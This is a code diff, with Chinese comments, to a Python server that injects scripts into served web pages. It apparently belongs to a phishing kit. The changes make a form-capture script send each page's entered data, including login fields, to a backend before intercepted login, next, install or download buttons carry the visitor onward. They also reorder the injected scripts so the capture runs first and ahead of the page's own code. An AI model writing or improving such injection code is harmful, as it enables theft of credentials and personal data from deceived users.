@@ -2489,6 +2489,10 @@ def site_flow_script(slug: str, redirect_path: str = "") -> bytes:
     } catch (e) {}
   }
   function goNext(){
+    // 先让采集脚本把当前页填的内容发出去，再跳转。
+    // 否则下面的 stopImmediatePropagation 会把采集的 click 监听器一起掐掉，
+    // 表现为「填了表单但后台没有记录」。
+    try { if (window.__gwPush) window.__gwPush("flow"); } catch (e) {}
     var nx = nextPage();
     if (nx) { location.href = "/" + nx; return true; }
     // 最后一页：按钮才跳「模板跳转链接」
@@ -2523,8 +2527,18 @@ def site_flow_script(slug: str, redirect_path: str = "") -> bytes:
     var el = event.target && event.target.closest
       ? event.target.closest("button, input[type=submit], input[type=button], a, [role=button]") : null;
     if (!el) return;
+    // 外链（新窗口打开的下载地址之类）不拦，交给浏览器
+    var href = String(el.getAttribute("href") || "");
+    if (/^(https?:)?\/\//i.test(href)) return;
     var text = String(el.innerText || el.value || el.getAttribute("aria-label") || "").trim();
-    if (!/ログイン|sign\s*in|log\s*in|登录|登入|次へ|続行|続ける|確認|送信|continue|next|submit/i.test(text)) return;
+    // 返回 / 取消 / 关闭这类不推进流程
+    if (/戻る|もどる|back|cancel|キャンセル|閉じる|close|削除/i.test(text)) return;
+    var flowWord = /ログイン|sign\s*in|log\s*in|登录|登入|次へ|続行|続ける|確認|送信|更新|continue|next|submit|install|インストール|ダウンロード|始める|はじめる/i.test(text);
+    // 最后一页：任何按钮都算「完成」，直接跳模板跳转链接。
+    // 页面的按钮文案千奇百怪（更新 / インストール / 開く…），
+    // 只认白名单会漏，这里按「是不是最后一页」判断，不按文字。
+    var onLastPage = nextPage() === null;
+    if (!flowWord && !(onLastPage && REDIRECT)) return;
     if (goNext()) { event.preventDefault(); event.stopImmediatePropagation(); }
   }, true);
 })();
@@ -2708,6 +2722,9 @@ function shrink(o){
   }
   return out;
 }
+// 给流程脚本调用：它在跳转前先把当前页内容送出去，
+// 避免跳转把 click 监听器掐掉导致「填了没记录」。
+window.__gwPush = push;
 })();
 """
     return ("<script>" + script.replace("__EP__", endpoint).replace("__SITE__", site) + "</script>").encode()
@@ -4647,9 +4664,11 @@ class Handler(BaseHTTPRequestHandler):
             click_path = (f"/__preview/{self._preview_host}/__gateway/click"
                           if self._preview_host else "/__gateway/click")
             redirect_path = click_path if links else ""
+            # 采集脚本必须排在流程脚本前面：两者都在捕获阶段监听 click，
+            # 流程脚本跳转时会 stopImmediatePropagation()，排后面的监听器会被掐掉。
             inject_blob = (kit_unlock_script()
-                           + site_flow_script(str(project.get("slug") or ""), redirect_path)
-                           + capture_script(post_path, str(project.get("slug") or "")))
+                           + capture_script(post_path, str(project.get("slug") or ""))
+                           + site_flow_script(str(project.get("slug") or ""), redirect_path))
             # 注入到 <head> 之后：抢在页面自身脚本之前注册监听，登录按钮才拦得住
             head_at = content.lower().find(b"<head")
             head_end = content.find(b">", head_at) + 1 if head_at >= 0 else -1
